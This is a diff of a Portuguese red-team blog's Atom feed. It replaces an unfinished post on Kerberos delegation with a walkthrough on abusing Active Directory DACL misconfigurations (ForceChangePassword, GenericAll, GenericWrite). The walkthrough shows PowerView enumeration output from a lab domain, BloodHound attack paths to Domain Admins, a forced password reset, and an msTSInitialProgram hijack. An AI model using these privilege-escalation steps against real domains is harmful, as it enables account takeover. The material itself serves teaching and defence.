@@ -1,368 +1,303 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-20T14:59:32-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">PS C:\Users\tuxtrack</title><subtitle>“The only person in computing that is paid to actually understand the system from top to bottom is the attacker! Everybody else usually gets paid to do their parts.”  Halvar Flake
-</subtitle><author><name>tuxtrack</name></author><entry><title type="html">Kerberos &amp;amp; Delegation</title><link href="http://localhost:4000/2020/05/09/k&d.html" rel="alternate" type="text/html" title="Kerberos &amp;amp; Delegation" /><published>2020-05-09T13:00:00-03:00</published><updated>2020-05-09T13:00:00-03:00</updated><id>http://localhost:4000/2020/05/09/k&amp;d</id><content type="html" xml:base="http://localhost:4000/2020/05/09/k&amp;d.html">&lt;p&gt;Dando continuidade aos posts relacionados ao kerberos, nesse blog post falaremos sobre Kerberos Delegation. 
-Delegation é usado para resolver o problema de quando um serviço necessita acessar outro serviço em um computador diferente. Esse cenário é conhecido como “Double Hop Problem”.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-26T16:15:59+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">PS C:\Users\tuxtrack</title><subtitle>“The only person in computing that is paid to actually understand the system from top to bottom is the attacker! Everybody else usually gets paid to do their parts.”  Halvar Flake
+</subtitle><author><name>tuxtrack</name></author><entry><title type="html">DACL &amp;amp; ACE’S ON ACTIVE DIRECTORY</title><link href="http://localhost:4000/2020/03/13/dacl.html" rel="alternate" type="text/html" title="DACL &amp;amp; ACE’S ON ACTIVE DIRECTORY" /><published>2020-03-13T12:55:00+00:00</published><updated>2020-03-13T12:55:00+00:00</updated><id>http://localhost:4000/2020/03/13/dacl</id><content type="html" xml:base="http://localhost:4000/2020/03/13/dacl.html"><![CDATA[<p>O Microsoft Active Directory possui grupos pré-definidos para delegar permissões a usuários e grupos, porém nem sempre é plausível delegar tantos poderes quando se precisa somente de poucos privilégios. Administradores de sistemas podem delegar permissões para usuários/computadores/grupos do domínio sem que os mesmos façam parte de um grupo privilegiado, assim, usuários poderão executar tarefas como, adicionar um usuário/grupo a um determinado grupo, alterar a senha de usuários e modificar propriedades inerentes ao objeto em questão através de ACL’s.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/k&amp;amp;d/2hop.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>Essas mesmas permissões criadas para ajudar no processo de delegação de privilégios podem criar problemas de segurança, levando atacantes por caminhos onde a escalação de privilégio pode ser atingida.</p>
 
-&lt;p&gt;Para trazer para o lado prático da coisa, imagine que inicialmente comprometemos uma máquina e estabelecemos acesso a mesma via &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pssessions?view=powershell-7&quot;&gt;PSSession&lt;/a&gt; utilizando-se do WinRM service. A partir dessa sessão estabelecida, tentamos acessar algum recurso em outra máquina pertecente ao mesmo domínio. O resultado dessa tentativa de acesso ao recurso será a negação da mesma. Isso por conta do modo como o kerberos encaminha os TGT’s para a autenticação e validação das contas de usuário.&lt;/p&gt;
+<p>DACL &amp; ACE</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/k&amp;amp;d/psfail.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>Todo <a href="https://docs.microsoft.com/pt-br/windows/win32/secauthz/securable-objects">Securable Object</a> possui um <a href="https://docs.microsoft.com/pt-br/windows/win32/secauthz/security-descriptors?redirectedfrom=MSDN">security descriptor</a> que pode incluir um Object Owner, <a href="https://docs.microsoft.com/pt-br/windows/win32/secauthz/access-control-lists?redirectedfrom=MSDN">DACL (Discretionary Access Control List)</a> e uma <a href="https://docs.microsoft.com/pt-br/windows/win32/secauthz/access-control-lists">SACL (System Access Control List)</a>.</p>
 
-&lt;p&gt;Levando em consideração que possuímos permissões de acesso, em uma sessão PSSession estaremos utilizando o logon type 3, &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows-server/security/windows-authentication/windows-logon-scenarios#network-logon&quot;&gt;Network Logon&lt;/a&gt;. O usuário irá receber o token de logon com Network Logon Type e nenhuma credencial será enviada ao host de destino nem solicitada devido a prévia checagem de autorização (&lt;a href=&quot;https://docs.microsoft.com/pt-br/windows-server/security/kerberos/kerberos-authentication-overview#practical-applications&quot;&gt;SSO&lt;/a&gt;). Sendo assim, não há credenciais para serem reutilizadas quando a partir do host de destino, tentarmos acessar o recurso no host alvo.&lt;/p&gt;
+<p>Security Descriptor Structure</p>
 
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Logon Type&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Logon title&lt;/th&gt;
-      &lt;th&gt;Description&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Interactive&lt;/td&gt;
-      &lt;td&gt;A user logged on to this computer&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;3&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Network&lt;/td&gt;
-      &lt;td&gt;A user or computer logged on to this computer from the network&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;5&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Service&lt;/td&gt;
-      &lt;td&gt;A service was started by the Service Control Manager.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;8&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;NetworkCleartext&lt;/td&gt;
-      &lt;td&gt;A user logged on to this computer from the network. The user’s password was passed to the authentication package in its unhashed form.&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SECURITY_DESCRIPTOR</span> <span class="p">{</span>
+  <span class="n">BYTE</span>                        <span class="n">Revision</span><span class="p">;</span>
+  <span class="n">BYTE</span>                        <span class="n">Sbz1</span><span class="p">;</span>
+  <span class="n">SECURITY_DESCRIPTOR_CONTROL</span> <span class="n">Control</span><span class="p">;</span>
+  <span class="n">PSID</span>                        <span class="n">Owner</span><span class="p">;</span>
+  <span class="n">PSID</span>                        <span class="n">Group</span><span class="p">;</span>
+  <span class="n">PACL</span>                        <span class="n">Sacl</span><span class="p">;</span>
+  <span class="n">PACL</span>                        <span class="n">Dacl</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">SECURITY_DESCRIPTOR</span><span class="p">,</span> <span class="o">*</span><span class="n">PISECURITY_DESCRIPTOR</span><span class="p">;</span>
+</code></pre></div></div>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/k&amp;amp;d/event.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/dacl.png" alt="upload-image" /></p>
 
-&lt;p&gt;Para resolver o problema, a Microsoft implementou um rescurso chamado Delegation. Primeiramente implementado no Windows Server 2000 através da forma conhecida como Unconstrained Delegation, a configuração sofreu algumas alterações sendo implementado a opção Constrained a partir da versão do Windows Server 2003 e Resource Based Delegation em 2016. Delegation é a permissão para um usuário ou computador de &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961980(v=technet.10)?redirectedfrom=MSDN&quot;&gt;personificar&lt;/a&gt; outra conta, resolvendo assim o Double Hop Problem, onde o token personificado será reutilizado para uma nova autenticação.&lt;/p&gt;
+<p>DACL’s são nada mais que um conjunto de <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries">ACE’s</a> agrupadas. Cada ACE refere-se a uma lista de permissões para usuário/grupos/processos, definidas por permitir ou negar acesso a determinada propriedade.</p>
 
-&lt;h2 id=&quot;unconstrained-delegation&quot;&gt;Unconstrained Delegation&lt;/h2&gt;
+<p><img src="/assets/img/sample/dacl/da.png" alt="upload-image" /></p>
 
-&lt;p&gt;Ao ser atribuído Unconstrained Delegation ao computador/conta, significa que o(a) mesma poderá personificar qualquer usuário do domínio. Assim, o mesmo computador/conta poderá acessar o recurso solicitado, reutilizando suas credenciais.&lt;/p&gt;
+<p>Quando um usuário solicita acesso a um objeto, há uma verificação de autorização onde o acesso é concedido baseando-se nas propriedades pré definidas, ex.: Read, Write, Delete e etc.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/k&amp;amp;d/undelegation.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/ace.png" alt="upload-image" /></p>
 
-&lt;p&gt;Ao ser solicitado o acesso a um recurso através de um computador com constrained delegation habilitado, um atacante poderá abusar do fato do token poder ser reutilizado para acessar qualquer recurso na rede, já que no modo Unconstrained o administrador de sistema não especifica o recurso que poderá reutilizar as credenciais.&lt;/p&gt;
+<blockquote>
+  <p>Any domain authenticated user can enumerate DACLs and Active Directory objects!</p>
+</blockquote>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/k&amp;amp;d/unconstrained.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>Veremos quais as implicações de segurança que a má configuração pode causar.</p>
 
-&lt;p&gt;Como exemplo imagine que&lt;/p&gt;
+<h2 id="forcechangepassword">ForceChangePassword</h2>
 
-&lt;h2 id=&quot;constrained-delegation&quot;&gt;Constrained Delegation&lt;/h2&gt;
+<p>O usuário/grupo com essas atribuições tem poderes para alterar a senha do objeto no qual a permissão foi delegada, sem a necessidade de conhecer a senha atual.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/k&amp;amp;d/constrained.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>Usando o cmdlet <a href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/">Get-ObjectAcl</a> do PowerView para listar as propriedades do objeto Maycon Vitali, o output informa que o IdentityReference HNR\hnr_hnr possui permissões ExtendedRight para o ObjectType User-Force-Change-Password, delegando poderes para todos os membros do grupo HNR\hnr_hnr de alterar a senha do objeto Maycon Vitali.</p>
 
-&lt;h2 id=&quot;rbcd---resource-based-constrained-delegation&quot;&gt;RBCD - Resource Based Constrained Delegation&lt;/h2&gt;
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\tuxtrack.HNR\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">objectdn</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"CN=Maycon Vitali,CN=Users,DC=hnr,DC=local"</span><span class="p">}</span><span class="w">
+</span><span class="n">InheritedObjectType</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">ObjectDN</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Maycon</span><span class="w"> </span><span class="nx">Vitali</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
+</span><span class="nx">ObjectType</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">User-Force-Change-Password</span><span class="w">
+</span><span class="n">IdentityReference</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">HNR\hnr_hnr</span><span class="w">
+</span><span class="n">IsInherited</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span><span class="n">ActiveDirectoryRights</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ExtendedRight</span><span class="w">
+</span><span class="n">PropagationFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">ObjectFlags</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">ObjectAceTypePresent</span><span class="w">
+</span><span class="n">InheritanceFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">ContainerInherit</span><span class="w">
+</span><span class="n">InheritanceType</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">AccessControlType</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Allow</span><span class="w">
+</span><span class="n">ObjectSID</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3380101520-2231475763-736739948-1103</span><span class="w">
+</span></code></pre></div></div>
 
-&lt;h2 id=&quot;quem-pode-delegar-como-enumerar&quot;&gt;Quem Pode Delegar? Como enumerar?&lt;/h2&gt;</content><author><name>tuxtrack</name></author><category term="ACTIVE DIRECTORY" /><category term="REDTEAM" /><category term="WINDOWS" /><category term="DELEGATION" /><summary type="html">Dando continuidade aos posts relacionados ao kerberos, nesse blog post falaremos sobre Kerberos Delegation. Delegation é usado para resolver o problema de quando um serviço necessita acessar outro serviço em um computador diferente. Esse cenário é conhecido como “Double Hop Problem”.</summary></entry><entry><title type="html">DACL &amp;amp; ACE’S ON ACTIVE DIRECTORY</title><link href="http://localhost:4000/2020/03/13/dacl.html" rel="alternate" type="text/html" title="DACL &amp;amp; ACE’S ON ACTIVE DIRECTORY" /><published>2020-03-13T09:55:00-03:00</published><updated>2020-03-13T09:55:00-03:00</updated><id>http://localhost:4000/2020/03/13/dacl</id><content type="html" xml:base="http://localhost:4000/2020/03/13/dacl.html">&lt;p&gt;O Microsoft Active Directory possui grupos pré-definidos para delegar permissões a usuários e grupos, porém nem sempre é plausível delegar tantos poderes quando se precisa somente de poucos privilégios. Administradores de sistemas podem delegar permissões para usuários/computadores/grupos do domínio sem que os mesmos façam parte de um grupo privilegiado, assim, usuários poderão executar tarefas como, adicionar um usuário/grupo a um determinado grupo, alterar a senha de usuários e modificar propriedades inerentes ao objeto em questão através de ACL’s.&lt;/p&gt;
+<p><a href="https://github.com/BloodHoundAD">BloodHound</a> attack path, partindo do node HNR\tuxtrack, usuário pertencente ao grupo HNR\hnr_hnr, com o objetivo de obter privilégios do grupo Domain Admins.</p>
 
-&lt;p&gt;Essas mesmas permissões criadas para ajudar no processo de delegação de privilégios podem criar problemas de segurança, levando atacantes por caminhos onde a escalação de privilégio pode ser atingida.&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/bh1.png" alt="upload-image" /></p>
 
-&lt;p&gt;DACL &amp;amp; ACE&lt;/p&gt;
+<p>Para abusar da ACE que permite a alteração da senha, utilizei o cmdlet Set-DomainUserPassword do PowerView. O parâmetro identity se refere a conta do usuário no qual se deseja alterar a senha.</p>
 
-&lt;p&gt;Todo &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows/win32/secauthz/securable-objects&quot;&gt;Securable Object&lt;/a&gt; possui um &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows/win32/secauthz/security-descriptors?redirectedfrom=MSDN&quot;&gt;security descriptor&lt;/a&gt; que pode incluir um Object Owner, &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows/win32/secauthz/access-control-lists?redirectedfrom=MSDN&quot;&gt;DACL (Discretionary Access Control List)&lt;/a&gt; e uma &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows/win32/secauthz/access-control-lists&quot;&gt;SACL (System Access Control List)&lt;/a&gt;.&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/fun1.png" alt="upload-image" /></p>
 
-&lt;p&gt;Security Descriptor Structure&lt;/p&gt;
+<h2 id="genericall">GenericAll</h2>
 
-&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_SECURITY_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;Revision&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;Sbz1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;SECURITY_DESCRIPTOR_CONTROL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;PSID&lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;Owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;PSID&lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;Group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;PACL&lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;Sacl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;PACL&lt;/span&gt;                        &lt;span class=&quot;n&quot;&gt;Dacl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SECURITY_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PISECURITY_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<p>Caso o usuário receba privilégio GenericAll, o mesmo terá poderes sobre todas as propriedades do objeto, podendo adcionar/remover usuários em grupos, alterar a senha de usuários, habilitar/desabilitar acesso a novos objetos e etc.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/dacl.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>O grupo HNR/hnr_biscates possuem total controle sobre as propriedades do usuário tuxtrack, como pode ser verificado abaixo.</p>
 
-&lt;p&gt;DACL’s são nada mais que um conjunto de &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries&quot;&gt;ACE’s&lt;/a&gt; agrupadas. Cada ACE refere-se a uma lista de permissões para usuário/grupos/processos, definidas por permitir ou negar acesso a determinada propriedade.&lt;/p&gt;
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\tuxtrack.HNR\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">objectdn</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"CN=tuxtrack,OU=hnr_blog,DC=hnr,DC=local"</span><span class="p">}</span><span class="w">
+</span><span class="n">InheritedObjectType</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">ObjectDN</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">tuxtrack</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">hnr_blog</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
+</span><span class="nx">ObjectType</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">IdentityReference</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">HNR\hnr_biscates</span><span class="w">
+</span><span class="n">IsInherited</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span><span class="n">ActiveDirectoryRights</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">GenericAll</span><span class="w">
+</span><span class="n">PropagationFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">ObjectFlags</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">InheritanceFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">ContainerInherit</span><span class="w">
+</span><span class="n">InheritanceType</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">AccessControlType</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Allow</span><span class="w">
+</span><span class="n">ObjectSID</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3380101520-2231475763-736739948-1105</span><span class="w">
+</span></code></pre></div></div>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/da.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p><a href="https://github.com/BloodHoundAD">BloodHound</a> attack path, partindo do node HNR\alexos, com o objetivo de obter privilégios do grupo Domain Admins.</p>
 
-&lt;p&gt;Quando um usuário solicita acesso a um objeto, há uma verificação de autorização onde o acesso é concedido baseando-se nas propriedades pré definidas, ex.: Read, Write, Delete e etc.&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/bh2.png" alt="upload-image" /></p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/sample/dacl/ace.png&quot; alt=&quot;upload-image&quot; /&gt;&lt;/p&gt;
+<p>Como prova de conceito, foi alterada a propriedade <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/7f65d267-8a3f-4070-b94a-111e793d4821">msTSInitialProgram</a>, adicionando o path de um compartilhamento de rede no qual o atacante possua acesso. Assim, o atacante poderá controlar o arquivo que foi inserido na propriedade.</p>
 
-&lt;blockquote&gt;
-  &lt;p&gt;Any domain authenticated user can enumerate DACLs and Active Directory objects!&lt;/p&gt;
-&lt;/blockquote&gt;
+<blockquote>
+  <p>msTSInitialProgram - This attribute specifies the path and file name of the application that the user wants to start automatically when the user logs on to the terminal server.</p>
+</blockquote>
 
-&lt;p&gt;Veremos quais as implicações de segurança que a má configuração pode causar.&lt;/p&gt;
+<p><img src="/assets/img/sample/dacl/fun2.png" alt="upload-image" /></p>
 
-&lt;h2 id=&quot;forcechangepassword&quot;&gt;ForceChangePassword&lt;/h2&gt;
+<h2 id="genericwrite">GenericWrite</h2>
 
-&lt;p&gt;O usuário/grupo com essas atribuições tem poderes para alterar a senha do objeto no qual a permissão foi delegada, sem a necessidade de conhecer a senha atual.&lt;/p&gt;
+<p>Generic Write permite a leitura que e escrita para qualquer atributo não projegido do objeto.</p>
 
-&lt;p&gt;Usando o cmdlet &lt;a href=&quot;https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/&quot;&gt;Get-ObjectAcl&lt;/a&gt; do PowerView para listar as propriedades do objeto Maycon Vitali, o output informa que o IdentityReference HNR\hnr_hnr possui permissões ExtendedRight para o ObjectType User-Force-Change-Password, delegando poderes para todos os membros do grupo HNR\hnr_hnr de alterar a senha do objeto Maycon Vitali.&lt;/p&gt;
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\tuxtrack.HNR\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">objectdn</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"CN=hnr_biscates,OU=HNR_Groups,DC=hnr,DC=local"</span><span class="p">}</span><span class="w">
+</span><span class="n">InheritedObjectType</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">ObjectDN</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">hnr_biscates</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">HNR_Groups</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
+</span><span class="nx">ObjectType</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w"> 
+</span><span class="n">IdentityReference</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">HNR\hnr_nullbyte</span><span class="w">
+</span><span class="n">IsInherited</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span><span class="n">ActiveDirectoryRights</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">WriteProperty</span><span class="w">
+</span><span class="n">PropagationFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">ObjectFlags</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">None</span><span class="w">
+</span><span class="n">InheritanceFlags</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">ContainerInherit</span><span class="w">
+</span><span class="n">InheritanceType</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="n">AccessControlType</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Allow</span><span class="w">
+</span><span class="n">ObjectSID</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3380101520-2231475763-736739948-1109</span><span class="w">
+</span></code></pre></div></div>
 
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\tuxtrack.HNR\Desktop&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Get-ObjectAcl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ResolveGUIDs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;objectdn&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=Maycon Vitali,CN=Users,DC=hnr,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InheritedObjectType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
